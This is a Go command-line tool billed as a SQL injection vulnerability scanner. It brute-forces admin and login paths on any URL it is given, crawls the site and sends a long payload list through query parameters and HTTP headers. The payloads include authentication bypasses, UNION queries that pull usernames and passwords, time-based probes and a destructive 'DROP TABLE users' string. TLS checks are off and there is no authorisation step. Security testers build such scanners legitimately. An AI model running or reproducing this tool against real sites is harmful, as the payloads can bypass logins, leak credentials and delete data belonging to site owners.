package main

import (
    "flag"
    "fmt"
    "log"
    "os"
    "time"
    "net/http"
    "sync"
    "strings"
    "net/url"
    "io/ioutil"
    "encoding/json"
    "bufio"
    "bytes"
    "crypto/tls"
    "github.com/PuerkitoBio/goquery"
    "github.com/gocolly/colly/v2"
    "github.com/fatih/color"
    "github.com/schollz/progressbar/v3"
)

var banner = `
                                        
   _____ ____    __       _____ _________    _   __
  / ___// __ \  / /      / ___// ____/   |  / | / /
  \__ \/ / / / / /       \__ \/ /   / /| | /  |/ / 
 ___/ / /_/ / / /___    ___/ / /___/ ___ |/ /|  /  
/____/\___\_\/_____/   /____/\____/_/  |_/_/ |_/   
 
v1.0 - SQL Injection Vulnerability Scanner
`

// Main configuration structure
type Config struct {
    Concurrent     int
    Timeout        time.Duration
    MaxDepth       int
    RateLimit      time.Duration
    LogFile        string
    OutputFormat   string
    FollowRedirect bool
    StartTime      time.Time
}

// Scan result structure
type ScanResult struct {
    URL           string
    Vulnerable    bool
    Payload       string
    Error         string
    ResponseTime  float64
    StatusCode    int
    Timestamp     time.Time
    ErrorDetails  []string
    FormFields    []string
    RiskLevel     string
    FixExample    string
    ResponseLen   int
}

// Main scanner structure
type Scanner struct {
    BaseURL     string
    Config      *Config
    Results     []ScanResult
    Pages       map[string]bool
    Logger      *log.Logger
    mutex       sync.RWMutex
    crawler     *colly.Collector
    sqlScanner  *SQLScanner
    bar         *progressbar.ProgressBar
}

// SQL Scanner structure
type SQLScanner struct {
    payloads      []string
    errorPatterns []string
    client        *http.Client
}

var sensitivePaths = []string{
    "/admin/index.php",
    "/admin/login.php",
    "/admin/admin.php",
    "/administrator/index.php",
    "/administrator/login.php",
    "/login/admin/index.php",
    "/login/admin.php",
    "/login/administrator/index.php",
    "/wp-admin/index.php",
    "/wp-login.php",
    "/phpmyadmin/index.php",
    "/phpMyAdmin/index.php",
    "/mysql/index.php",
    "/admin/dashboard.php",
    "/admin/dashboard/index.php",
    "/admin/panel/index.php",
    "/adminpanel/index.php",
    "/cpanel/index.php",
    "/user/admin/index.php",
    "/backend/index.php",
    "/admin/backend/index.php",
    "/manage/index.php",
    "/management/index.php",
    "/control/index.php",
    "/member/admin/index.php",
    "/moderator/index.php",
    "/webadmin/index.php",
    "/adminarea/index.php",
    "/bb-admin/index.php",
    "/adminLogin/index.php",
    "/admin_area/index.php",
    "/panel-administracion/index.php",
    "/instadmin/index.php",
    "/memberadmin/index.php",
    "/administratorlogin/index.php",
    "/modules/admin/index.php",
    "/administrators/index.php",
    "/siteadmin/index.php",
    "/siteadmin/login.php",
    "/admin/login/index.php",
    "/test/index.php",
}

// Extend paths with different extensions
func generateExtendedPaths(paths []string) []string {
    extensions := []string{"", ".php", ".html", ".asp", ".aspx", ".jsp", ".action", ".do"}
    directories := []string{
        "/admin", "/administrator", "/login", "/backend", "/manage",
        "/control", "/panel", "/webadmin", "/adminpanel", "/moderator",
        "/user", "/account", "/member", "/members", "/setup",
    }

    var extendedPaths []string

    // Add direct sensitive paths
    extendedPaths = append(extendedPaths, sensitivePaths...)

    // Generate combinations
    for _, dir := range directories {
        for _, ext := range extensions {
            extendedPaths = append(extendedPaths, dir+ext)
            extendedPaths = append(extendedPaths, dir+"/index"+ext)
            extendedPaths = append(extendedPaths, dir+"/login"+ext)
            extendedPaths = append(extendedPaths, dir+"/admin"+ext)
            extendedPaths = append(extendedPaths, dir+"/main"+ext)
        }

        // Add common subdirectories
        subDirs := []string{"/admin", "/user", "/manage", "/control", "/panel"}
        for _, subDir := range subDirs {
            for _, ext := range extensions {
                extendedPaths = append(extendedPaths, dir+subDir+ext)
                extendedPaths = append(extendedPaths, dir+subDir+"/index"+ext)
                extendedPaths = append(extendedPaths, dir+subDir+"/login"+ext)
            }
        }
    }

    return extendedPaths
}

// Complete list of SQL payloads
var sqlPayloads = []string{
    "'",
    "' OR '1'='1",
    "1' OR '1' = '1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "admin' --",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "' UNION ALL SELECT @@version --",
    "' HAVING 1=1--",
    "' GROUP BY columnnames having 1=1--",
    "' OR 'one'='one",
    "' OR 1 in (SELECT @@version)--",
    "' OR 1=1 LIMIT 1--",
    "admin' OR '1'='1'#",
    "' UNION SELECT NULL,NULL,CONCAT(login,':',password),NULL FROM users--",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1 UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' OR '1' = '1' /* ",
    "' OR 'x'='x' #",
    "/**/SELECT/**/",
    "' UnIoN SeLeCt ",
    // Database-specific payloads
    "' OR pg_sleep(5)--", // PostgreSQL
    "' OR IF(1=1, SLEEP(5), 0)--", // MySQL
    "' WAITFOR DELAY '00:00:05'--", // MSSQL
    // Authentication bypass payloads
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    // Data extraction payloads
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT user(),database()--",
    // Time-based payloads
    "' OR IF(1=1, SLEEP(5), 0)--",
    "' OR pg_sleep(5)--",
    // Encoded payloads (hex, base64)
    "0x31", // Hex
    "0x31' OR '1'='1",
    "0x31' OR 1=1--",
    "0x31 UNION SELECT NULL--",
    "ZGV2", // Base64
    "ZGV2' OR '1'='1",
    "ZGV2' OR 1=1--",
    "ZGV2 UNION SELECT NULL--",
}

// List of SQL error patterns
var sqlErrorPatterns = []string{
    "SQL syntax",
    "mysql_fetch",
    "MySQLSyntaxErrorException",
    "valid MySQL result",
    "mysqli_fetch_array",
    "ORA-01756",
    "SQLite/JDBCDriver",
    "System.Data.SQLClient.SqlException",
    "Microsoft SQL Native Client error",
    "ODBC Driver",
    "PostgreSQL",
    "Npgsql",
    "PG::Error",
    "PSQLException",
    "ORA-",
    "MySQL server version",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQL syntax.*MySQL",
    "Warning.*mysql_.*",
    "PostgreSQL.*ERROR",
    "Warning.*pg_.*",
    "valid PostgreSQL result",
    "Oracle.*ORA-[0-9]",
    // Add more SQL error detection patterns
    "unterminated quoted string",
    "quoted string not properly terminated",
    "unexpected end of SQL command",
    "incorrect syntax near",
    "syntax error, unexpected",
    "SQLSTATE[HY000]",
    "SQLSTATE[42000]",
    "SQLSTATE[42S02]",
    "SQLSTATE[42S22]",
}

// Initialize SQL Scanner
func NewSQLScanner(timeout time.Duration) *SQLScanner {
    return &SQLScanner{
        payloads:      sqlPayloads,
        errorPatterns: sqlErrorPatterns,
        client: &http.Client{
            Timeout: timeout,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            },
        },
    }
}

// Test a specific URL
func (s *SQLScanner) TestURL(targetURL string, payload string) (*ScanResult, error) {
    start := time.Now()

    parsedURL, err := url.Parse(targetURL)
    if err != nil {
        return nil, err
    }

    q := parsedURL.Query()
    for key := range q {
        q.Set(key, payload)
    }
    if len(q) == 0 {
        q.Set("id", payload)
    }
    parsedURL.RawQuery = q.Encode()

    req, err := http.NewRequest("GET", parsedURL.String(), nil)
    if err != nil {
        return nil, err
    }

    // Test HTTP headers
    req.Header.Set("User-Agent", payload)
    req.Header.Set("Referer", payload)

    resp, err := s.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    duration := time.Since(start).Seconds()
    bodyStr := string(body)

    var errorDetails []string
    isVulnerable := false

    for _, pattern := range s.errorPatterns {
        if strings.Contains(bodyStr, pattern) {
            isVulnerable = true
            errorDetails = append(errorDetails, fmt.Sprintf("Pattern found: %s", pattern))
        }
    }

    if resp.StatusCode == 500 {
        isVulnerable = true
        errorDetails = append(errorDetails, "Server error 500 detected")
    }

    if duration > 5.0 {
        errorDetails = append(errorDetails, "Abnormal response time detected")
    }

    // Analyze DOM changes
    doc, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
    if err != nil {
        return nil, err
    }
    domChanges := doc.Find("script, style, iframe, object, embed, link").Length()
    if domChanges > 0 {
        errorDetails = append(errorDetails, fmt.Sprintf("DOM changes detected: %d elements", domChanges))
    }

    return &ScanResult{
        URL:          targetURL,
        Vulnerable:   isVulnerable,
        Payload:      payload,
        ResponseTime: duration,
        StatusCode:   resp.StatusCode,
        Timestamp:    time.Now(),
        ErrorDetails: errorDetails,
        ResponseLen:  len(body),
    }, nil
}

// Initialize main Scanner
func NewScanner(baseURL string) *Scanner {
    config := &Config{
        Concurrent:     20,
        Timeout:        10 * time.Second,
        MaxDepth:       5,
        RateLimit:      time.Millisecond * 100,
        LogFile:        "sqlscan.log",
        OutputFormat:   "json",
        FollowRedirect: true,
        StartTime:      time.Now(),
    }

    c := colly.NewCollector(
        colly.MaxDepth(config.MaxDepth),
        colly.Async(true),
    )
    c.Limit(&colly.LimitRule{
        DomainGlob:  "*",
        Parallelism: config.Concurrent,
        Delay:       config.RateLimit,
    })

    logFile, err := os.OpenFile(config.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal(err)
    }
    logger := log.New(logFile, "", log.LstdFlags)

    return &Scanner{
        BaseURL:    baseURL,
        Config:     config,
        Pages:      make(map[string]bool),
        Logger:     logger,
        crawler:    c,
        sqlScanner: NewSQLScanner(config.Timeout),
    }
}

// Load wordlist from GitHub
func loadWordlist() ([]string, error) {
    wordlistURL := "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"

    resp, err := http.Get(wordlistURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var paths []string
    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        paths = append(paths, scanner.Text())
    }

    return paths, scanner.Err()
}

func (s *Scanner) scanPaths() error {
    color.Yellow("\n[*] Loading paths to test...")

    // Load base wordlist
    paths, err := loadWordlist()
    if err != nil {
        return fmt.Errorf("error loading wordlist: %v", err)
    }

    // Generate extended paths
    extendedPaths := generateExtendedPaths(paths)
    paths = append(paths, extendedPaths...)

    color.Yellow("[*] Total paths to test: %d", len(paths))

    bar := progressbar.Default(int64(len(paths)))
    var wg sync.WaitGroup
    sem := make(chan bool, s.Config.Concurrent)

    for _, path := range paths {
        wg.Add(1)
        sem <- true

        go func(p string) {
            defer wg.Done()
            defer func() { <-sem }()
            fullURL := s.BaseURL + p
            req, err := http.NewRequest("GET", fullURL, nil)
            if err != nil {
                bar.Add(1)
                return
            }

            // Test cookies
            req.AddCookie(&http.Cookie{Name: "test", Value: "test"})

            resp, err := http.DefaultClient.Do(req)
            if err != nil {
                bar.Add(1)
                return
            }
            defer resp.Body.Close()

            // Check interesting status codes
            if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 401 {
                s.mutex.Lock()
                s.Pages[fullURL] = true
                s.mutex.Unlock()

                statusColor := color.FgGreen
                if resp.StatusCode == 403 || resp.StatusCode == 401 {
                    statusColor = color.FgYellow
                }

                color.New(statusColor).Printf("\n[+] Page found: %s (Code: %d)\n", fullURL, resp.StatusCode)
            }

            bar.Add(1)
        }(path)
    }

    wg.Wait()
    return nil
}

func (s *Scanner) Start() error {
    color.Cyan(banner)
    color.Green("[+] Initializing scan on %s", s.BaseURL)

    // Scan sensitive paths
    if err := s.scanPaths(); err != nil {
        return fmt.Errorf("error scanning paths: %v", err)
    }

    // Configure crawler for additional discovery
    s.crawler.OnHTML("a[href]", func(e *colly.HTMLElement) {
        link := e.Attr("href")
        absoluteURL := e.Request.AbsoluteURL(link)

        if absoluteURL != "" && strings.HasPrefix(absoluteURL, s.BaseURL) {
            s.mutex.Lock()
            if !s.Pages[absoluteURL] {
                s.Pages[absoluteURL] = true
                s.mutex.Unlock()
                e.Request.Visit(absoluteURL)
            } else {
                s.mutex.Unlock()
            }
        }
    })

    // Crawl the site
    s.crawler.Visit(s.BaseURL)
    s.crawler.Wait()

    // Run SQL tests
    return s.runSQLTests()
}

// Generate report
func (s *Scanner) GenerateReport() string {
    var output strings.Builder

    color.New(color.FgGreen).Fprintln(&output, "\n=== SQL Scan Report ===\n")
    color.New(color.FgCyan).Fprintf(&output, "Base URL: %s\n", s.BaseURL)
    color.New(color.FgCyan).Fprintf(&output, "Pages tested: %d\n", len(s.Pages))
    color.New(color.FgCyan).Fprintf(&output, "Tests performed: %d\n", len(s.Pages) * len(sqlPayloads))
    color.New(color.FgCyan).Fprintf(&output, "Scan duration: %s\n", time.Since(s.Config.StartTime))
    color.New(color.FgRed).Fprintf(&output, "Vulnerabilities found: %d\n\n", len(s.Results))

    for _, result := range s.Results {
        color.New(color.FgRed).Fprintf(&output, "Vulnerable URL: %s\n", result.URL)
        color.New(color.FgYellow).Fprintf(&output, "Payload: %s\n", result.Payload)
        color.New(color.FgCyan).Fprintf(&output, "Status code: %d\n", result.StatusCode)
        color.New(color.FgCyan).Fprintf(&output, "Response time: %.2fs\n", result.ResponseTime)
        color.New(color.FgCyan).Fprintf(&output, "Risk level: %s\n", result.RiskLevel)
        color.New(color.FgCyan).Fprintf(&output, "Fix example: %s\n", result.FixExample)

        if len(result.ErrorDetails) > 0 {
            color.New(color.FgYellow).Fprintln(&output, "Details:")
            for _, detail := range result.ErrorDetails {
                color.New(color.FgWhite).Fprintf(&output, "  - %s\n", detail)
            }
        }
        output.WriteString("---\n")
    }

    return output.String()
}

func main() {
    flag.Parse()

    if len(flag.Args()) != 1 {
        color.Red("Usage: sqlscan <url>")
        os.Exit(1)
    }

    targetURL := flag.Args()[0]
    scanner := NewScanner(targetURL)

    err := scanner.Start()
    if err != nil {
        color.Red("[!] Error during scan: %v", err)
        os.Exit(1)
    }

    // Generate and display report
    report := scanner.GenerateReport()
    fmt.Println(report)

    // Save report to file
    /*
    reportPath := fmt.Sprintf("report_%s.txt", time.Now().Format("20060102_150405"))
    err = ioutil.WriteFile(reportPath, []byte(report), 0644)
    if err != nil {
        color.Red("[!] Error saving report: %v", err)
    } else {
        color.Green("[+] Report saved to: %s", reportPath)
    }*/

    // Display final statistics
    color.Yellow("\nFinal statistics:")
    color.Yellow("- Total duration: %s", time.Since(scanner.Config.StartTime))
    color.Yellow("- Pages scanned: %d", len(scanner.Pages))
    color.Yellow("- Injection tests performed: %d", len(scanner.Pages)*len(sqlPayloads))
    color.Yellow("- Vulnerabilities found: %d", len(scanner.Results))

    // If vulnerabilities were found, create JSON report
    if len(scanner.Results) > 0 {
        jsonReport := struct {
            Timestamp    time.Time     `json:"timestamp"`
            Target       string        `json:"target"`
            Duration     string        `json:"duration"`
            PagesScanned int           `json:"pages_scanned"`
            TestsRun     int           `json:"tests_run"`
            Vulnerabilities []ScanResult `json:"vulnerabilities"`
        }{
            Timestamp:    time.Now(),
            Target:       targetURL,
            Duration:     time.Since(scanner.Config.StartTime).String(),
            PagesScanned: len(scanner.Pages),
            TestsRun:     len(scanner.Pages) * len(sqlPayloads),
            Vulnerabilities: scanner.Results,
        }

        jsonData, err := json.MarshalIndent(jsonReport, "", "    ")
        if err == nil {
            jsonPath := fmt.Sprintf("report_%s.json", time.Now().Format("20060102_150405"))
            if err := ioutil.WriteFile(jsonPath, jsonData, 0644); err == nil {
                color.Green("[+] JSON report saved to: %s", jsonPath)
            }
        }
    }

    // Security suggestions if vulnerabilities are found
    if len(scanner.Results) > 0 {
        color.Red("\n[!] Vulnerabilities were found. Security suggestions:")
        color.Yellow("1. Use prepared statements or ORMs")
        color.Yellow("2. Validate and sanitize all user input")
        color.Yellow("3. Apply the principle of least privilege for database users")
        color.Yellow("4. Enable Web Application Firewall (WAF)")
        color.Yellow("5. Monitor database logs")
    }

    // End message
    if len(scanner.Results) == 0 {
        color.Green("\n[+] No SQL vulnerabilities detected!")
    } else {
        color.Red("\n[!] Scan completed. Please review the report for details.")
    }

    // Cleanup
    if err := scanner.Logger.Writer().(*os.File).Close(); err != nil {
        color.Red("[!] Error closing log file: %v", err)
    }
}

func (s *Scanner) runSQLTests() error {
    color.Green("\n[+] Starting SQL injection tests")
    color.Yellow("[*] Testing %d discovered pages with %d payloads", len(s.Pages), len(sqlPayloads))

    bar := progressbar.Default(int64(len(s.Pages) * len(sqlPayloads)))

    var wg sync.WaitGroup
    sem := make(chan bool, s.Config.Concurrent)

    for page := range s.Pages {
        // Check if page has GET parameters
        parsedURL, err := url.Parse(page)
        if err != nil {
            continue
        }

        // If URL has no parameters, add a test 'id' parameter
        hasParams := len(parsedURL.Query()) > 0

        for _, payload := range sqlPayloads {
            wg.Add(1)
            sem <- true

            go func(p string, payload string, hasParams bool) {
                defer wg.Done()
                defer func() { <-sem }()

                // If no parameters, test with added parameter
                if !hasParams {
                    if strings.Contains(p, "?") {
                        p += "&id=1"
                    } else {
                        p += "?id=1"
                    }
                }

                result, err := s.sqlScanner.TestURL(p, payload)
                if err != nil {
                    s.Logger.Printf("Error testing %s: %v", p, err)
                    bar.Add(1)
                    return
                }

                if result.Vulnerable {
                    s.mutex.Lock()
                    result.RiskLevel = "High"
                    result.FixExample = "Use prepared statements to prevent SQL injection."
                    s.Results = append(s.Results, *result)
                    s.mutex.Unlock()

                    color.Red("\n[!] Vulnerability found!")
                    color.Red("    URL: %s", p)
                    color.Red("    Payload: %s", payload)
                    if len(result.ErrorDetails) > 0 {
                        color.Yellow("    Details: %s", strings.Join(result.ErrorDetails, ", "))
                    }
                }

                bar.Add(1)
            }(page, payload, hasParams)
        }
    }

    wg.Wait()

    color.Green("\n[+] SQL injection tests completed")
    if len(s.Results) > 0 {
        color.Red("[!] %d vulnerabilities found", len(s.Results))
    } else {
        color.Green("[+] No SQL vulnerabilities detected")
    }

    return nil
}